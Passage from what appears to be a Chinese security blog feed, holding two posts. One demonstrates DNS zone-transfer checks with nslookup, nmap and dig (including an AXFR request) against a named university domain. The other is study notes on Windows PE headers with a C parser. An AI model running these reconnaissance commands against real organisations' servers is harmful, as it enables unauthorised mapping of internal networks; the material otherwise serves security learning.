<p>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 <code>Private DNS</code> 。如果内部 <code>DNS</code>  泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。</p>
<h4 id="dns域传送漏洞检测"><a class="anchor" href="#dns域传送漏洞检测">#</a> DNS 域传送漏洞检测</h4>
<p>常用的三种检测方法:  <code>nslookup</code>  命令， <code>nmap</code>  命令， <code>dig</code>  命令，下面将分别演示如何用三种方法检测 <code>dns</code>  域传送漏洞</p>
<p>利用 <code>nslookup</code>  命令发现 <code>DNS</code>  域传送命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\Users\21r000<span class="token operator">></span>nslookup</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">默认服务器</span><span class="token operator">:</span>  UnKnown</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">Address</span><span class="token operator">:</span>  <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.12</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">></span> server 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token literal-property property">默认服务器</span><span class="token operator">:</span>  21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">Address</span><span class="token operator">:</span>  <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.12</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207152604456.png" alt="image-20211207152604456" /></p>
<p>若是不存在漏洞的主机，则可能提示错误 <code>Query Refused</code> :</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">></span> ls 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span>21r000<span class="token punctuation">.</span>org<span class="token punctuation">]</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207152653580.png" alt="image-20211207152653580" /></p>
<p>如存在漏洞的 <code>DNS</code>  服务器则会显示，如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207152743087.png" alt="image-20211207152743087" /></p>
<p>操作基本的步骤是:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>输入nslookup命令进入交互式shell</pre></td></tr><tr><td data-num="2"></td><td><pre>Server 命令参数设定查询将要使用的<span class="token constant">DNS</span>服务器</pre></td></tr><tr><td data-num="3"></td><td><pre>Ls命令列出某个域中的所有域名</pre></td></tr></table></figure><p>攻击者能获取的敏感主要包括：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>）网络的拓扑结构，服务器集中的<span class="token constant">IP</span>地址段</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">2</span>）数据库服务器的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">3</span>）测试服务器的<span class="token constant">IP</span>地址，</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">4</span>）<span class="token constant">VPN</span>服务器地址泄露</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">5</span>）其他敏感服务器</pre></td></tr></table></figure><h4 id="使用nmap扫描dns域传送泄露漏洞"><a class="anchor" href="#使用nmap扫描dns域传送泄露漏洞">#</a> 使用 <code>nmap</code>  扫描 <code>DNS</code>  域传送泄露漏洞</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">--</span>script dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer <span class="token operator">--</span>script<span class="token operator">-</span>args dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer<span class="token punctuation">.</span>domain<span class="token operator">=</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">-</span>Pn dns1<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207153238195.png" alt="image-20211207153238195" /></p>
<p>对上述命令命令说明如下：</p>
<p><code>nmap –script dns-zone-transfer</code>  表示加载 <code>nmap</code>  文件夹下的脚本文件 <code>dns-zone-transfer.nse</code> ，扩展名 <code>.nse</code>  可省略</p>
<p><code>–script-args dns-zone-transfer.domain=zonetransfer.me</code>  向脚本传递参数，设置列出记录的域是 <code>nwpu.edu.cn</code></p>
<p><code>-p 53</code>  设置扫描 <code>53</code>  端口</p>
<p><code>-Pn</code> : 设置通过 <code>Ping</code>  发现主机是否存活</p>
<h4 id="利用dig-检测dns域传送漏洞"><a class="anchor" href="#利用dig-检测dns域传送漏洞">#</a> 利用 <code>dig</code>  检测 <code>dns</code>  域传送漏洞</h4>
<p>这里涉及 <code>dig</code>  一个重要的命令 <code>axfr</code> :</p>
<p><code>axfr</code>  是 <code>q-type</code>  类型的一种:  <code>axfr</code>  类型是 <code>Authoritative Transfer</code>  的缩写，指请求传送某个区域的全部记录。</p>
<p>我们只要欺骗 <code>dns</code>  服务器发送一个 <code>axfr</code>  请求过去，　如果该 <code>dns</code>  服务器上存在该漏洞，就会返回所有的解析记录值</p>
<p>第一步：找到解析域名的 <code>dns</code>  服务器 ( <code>Server</code>  服务器), 我们可以发送一个 <code>ns</code>  类型解析请求过去</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# dig thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn ns              </pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> DiG <span class="token number">9.16</span><span class="token number">.15</span><span class="token operator">-</span>Debian <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn ns</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> global options<span class="token operator">:</span> <span class="token operator">+</span>cmd</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> Got answer<span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token operator">-</span><span class="token operator">>></span><span class="token constant">HEADER</span><span class="token operator">&lt;&lt;</span><span class="token operator">-</span> opcode<span class="token operator">:</span> <span class="token constant">QUERY</span><span class="token punctuation">,</span> <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token constant">NOERROR</span><span class="token punctuation">,</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">30258</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> flags<span class="token operator">:</span> qr rd ra<span class="token punctuation">;</span> <span class="token constant">QUERY</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">ANSWER</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">AUTHORITY</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">ADDITIONAL</span><span class="token operator">:</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">OPT</span> <span class="token constant">PSEUDOSECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">;</span> <span class="token constant">EDNS</span><span class="token operator">:</span> version<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">flags</span><span class="token operator">:</span><span class="token punctuation">;</span> <span class="token constant">MBZ</span><span class="token operator">:</span> <span class="token number">0x0005</span><span class="token punctuation">,</span> <span class="token literal-property property">udp</span><span class="token operator">:</span> <span class="token number">4000</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">QUESTION</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">;</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>                   <span class="token constant">IN</span>      <span class="token constant">NS</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">ANSWER</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>            <span class="token number">5</span>       <span class="token constant">IN</span>      <span class="token constant">NS</span>      dns2<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">ADDITIONAL</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>dns2<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>       <span class="token number">5</span>       <span class="token constant">IN</span>      <span class="token constant">A</span>       <span class="token number">222.160</span><span class="token number">.127</span><span class="token number">.38</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207153332953.png" alt="image-20211207153332953" /></p>
<p>第二步：然后向该域名发送 <code>axfr</code>  请求：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# dig axfr @dns1<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207153510931.png" alt="image-20211207153510931" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>唔，该复习了，孩子要挂科了呜呜呜！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207153745779.png" alt="image-20211207153745779" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHV3b28ubmV0LzIwMjAvcG9zdC00MTQ5Lmh0bWw=">Windows DPAPI 数据加密保护接口详解</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kMmFmMDhlNmY4ZmI=">dns 域传送漏洞利用总结</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之概述与MS-DOS和PE头解析</title>
    <url>/article/ac0ed2e7.html</url>
    <content><![CDATA[<p>路飞桑 yyds！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213080423858.png" alt="image-20220213080423858" /></p>
<h2 id="概述"><a class="anchor" href="#概述">#</a> 概述</h2>
<p>PE（Portable Execute）文件是 Windows 下可移植、可执行文件的总称，常见的有 DLL，EXE，OCX，SYS，COM 等都是 PE 文件，PE 文件是微软 Windows 操作系统上的程序文件（可能是间接被执行，如 DLL）。</p>
<p>而事实上，一个文件是否是 PE 文件与其扩展名无关，PE 文件可以是任何扩展名。</p>
<p>PE 文件的结构一般来说如下图所示：从起始位置开始依次是 MS-DOS 头，标准 PE 头，扩展 PE 头，数据目录，以及节表。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213055508431.png" alt="image-20220213055508431" /></p>
<h2 id="ms-dos"><a class="anchor" href="#ms-dos">#</a> MS-DOS</h2>
<p>使用 010 打开一个 exe 文件可以看到 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213061241744.png" alt="image-20220213061241744" /></p>
<p>MS-DOS 头出于兼容性的目的而存在，主要是为了防止 PE 文件运行在 MS-DOS 系统下出现错误。</p>
<h3 id="ms-dos头结构"><a class="anchor" href="#ms-dos头结构">#</a> MS-DOS 头结构</h3>
<p>通过 <code>_IMAGE_DOS_HEADER</code>  结构体读取我们所要的 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213062739666.png" alt="image-20220213062739666" /></p>
<p>MS-DOS 标识：4D5A</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213062943734.png" alt="image-20220213062943734" /></p>
<p>头标志判断是否为 MS-DOS 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213063119930.png" alt="image-20220213063119930" /></p>
<p>指向新的 PE 头</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213063158508.png" alt="image-20220213063158508" /></p>
<h3 id="读取程序"><a class="anchor" href="#读取程序">#</a> 读取程序</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065944374.png" alt="image-20220213065944374" /></p>
<h3 id="报错"><a class="anchor" href="#报错">#</a> 报错</h3>
<pre><code class="language-ABAP">1&gt;c:\users\21r000\source\repos\project3\project3\pe.cpp(9): error C4996: 'fopen': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065505363.png" alt="image-20220213065505363" /></p>
<h4 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h4>
<pre><code class="language-ABAP">项目-&gt;XX属性-&gt;C++-&gt;预处理器-&gt;在预处理器定义添加“_CRT_SECURE_NO_WARNINGS”
</code></pre>
<p>具体操作如图：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065712939.png" alt="image-20220213065712939" /></p>
<p>添加 <code>_CRT_SECURE_NO_WARNINGS</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213065851431.png" alt="image-20220213065851431" /></p>
<h2 id="pe头"><a class="anchor" href="#pe头">#</a> PE 头</h2>
<h3 id="pe头结构"><a class="anchor" href="#pe头结构">#</a> PE 头结构</h3>
<p>PE 头分为：</p>
<ul>
<li>标准 PE 头：每一个 PE 文件中都有。</li>
<li>扩展 PE 头：可有可无。</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071122271.png" alt="image-20220213071122271" /></p>
<p><code>_IMAGE_NT_HEADERS</code> ，分为 32 位和 64 位两个版本，根据逆向解析的程序使用相应的版本。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213070757581.png" alt="image-20220213070757581" /></p>
<p>PE 标识：5045</p>
<p><code>IMAGE_FILE_HEADER</code>  定义</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071611782.png" alt="image-20220213071611782" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>WORD    Machine<span class="token punctuation">;</span>                <span class="token comment">// 可以运行在什么样的 CPU 上 任意：0 Intel 386 以及后续：14C x64：8864</span></pre></td></tr><tr><td data-num="2"></td><td><pre>WORD    NumberOfSections<span class="token punctuation">;</span>       <span class="token comment">// 表示节的数量</span></pre></td></tr><tr><td data-num="3"></td><td><pre>DWORD   TimeDateStamp<span class="token punctuation">;</span>          <span class="token comment">// 编译器填写的时间戳，与文件属性里面的创建时间、修改时间无关</span></pre></td></tr><tr><td data-num="4"></td><td><pre>DWORD   PointerToSymbolTable<span class="token punctuation">;</span>   <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD   NumberOfSymbols<span class="token punctuation">;</span>        <span class="token comment">// 调试相关</span></pre></td></tr><tr><td data-num="6"></td><td><pre>WORD    SizeOfOptionalHeader<span class="token punctuation">;</span>   <span class="token comment">// 可选 PE 头的大小 (32 位 PE 文件：0xE0 64 位 PE 文件：0xF0)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>WORD    Characteristics<span class="token punctuation">;</span>        <span class="token comment">// 文件属性</span></pre></td></tr></table></figure><table>
<thead>
<tr>
<th style="text-align:left">成员</th>
<th style="text-align:left">大小 (十进制)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Machine</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSections</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">TimeDateStamp</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">PointerToSymbolTable</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">NumberOfSymbols</td>
<td style="text-align:left">4 字节</td>
</tr>
<tr>
<td style="text-align:left">SizeOfOptionalHeader</td>
<td style="text-align:left">2 字节</td>
</tr>
<tr>
<td style="text-align:left">Characteristics</td>
<td style="text-align:left">2 字节</td>
</tr>
</tbody>
</table>
<p>宏定义：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071509571.png" alt="image-20220213071509571" /></p>
<p>通过 PE 编辑器可以查看文件信息，从而便于编写程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213071746220.png" alt="image-20220213071746220" /></p>
<h3 id="常用区段"><a class="anchor" href="#常用区段">#</a> 常用区段</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>text <span class="token punctuation">.</span>code <span class="token comment">// 代码段</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>data <span class="token comment">// 可读写数据段，存放全局变量和 C 盘变量</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>rdata <span class="token comment">// 只读数据段</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">.</span>idata <span class="token comment">// 导入数据段</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>edata <span class="token comment">// 导出数据段</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">.</span>rsrc <span class="token comment">// 资源段</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>bss <span class="token comment">// 未初始化数据</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">.</span>crt <span class="token comment">// 用于 C++ 运行时 (CRT) 所添加的数据</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>tls <span class="token comment">// 线程局部存储器，这包括数据的初始化值，也包括运行时所需要的额外变量</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">.</span>reloc <span class="token comment">// 可执行文件的基址重定位</span></pre></td></tr></table></figure><h3 id="常见pe属性"><a class="anchor" href="#常见pe属性">#</a> 常见 PE 属性</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213073745540.png" alt="image-20220213073745540" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_RELOCS_STRIPPED</span>           <span class="token expression"><span class="token number">0x0001</span>  </span><span class="token comment">// Relocation info stripped from file.</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_EXECUTABLE_IMAGE</span>          <span class="token expression"><span class="token number">0x0002</span>  </span><span class="token comment">// File is executable  (i.e. no unresolved external references).</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LINE_NUMS_STRIPPED</span>        <span class="token expression"><span class="token number">0x0004</span>  </span><span class="token comment">// Line nunbers stripped from file.</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LOCAL_SYMS_STRIPPED</span>       <span class="token expression"><span class="token number">0x0008</span>  </span><span class="token comment">// Local symbols stripped from file.</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_AGGRESIVE_WS_TRIM</span>         <span class="token expression"><span class="token number">0x0010</span>  </span><span class="token comment">// Aggressively trim working set</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_LARGE_ADDRESS_AWARE</span>       <span class="token expression"><span class="token number">0x0020</span>  </span><span class="token comment">// App can handle >2gb addresses</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_BYTES_REVERSED_LO</span>         <span class="token expression"><span class="token number">0x0080</span>  </span><span class="token comment">// Bytes of machine word are reversed.</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_32BIT_MACHINE</span>             <span class="token expression"><span class="token number">0x0100</span>  </span><span class="token comment">// 32 bit word machine.</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_DEBUG_STRIPPED</span>            <span class="token expression"><span class="token number">0x0200</span>  </span><span class="token comment">// Debugging info stripped from file in .DBG file</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP</span>   <span class="token expression"><span class="token number">0x0400</span>  </span><span class="token comment">// If Image is on removable media, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_FILE_NET_RUN_FROM_SWAP</span>         <span class="token expression"><span class="token number">0x0800</span>  </span><span class="token comment">// If Image is on Net, copy and run from the swap file.</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive 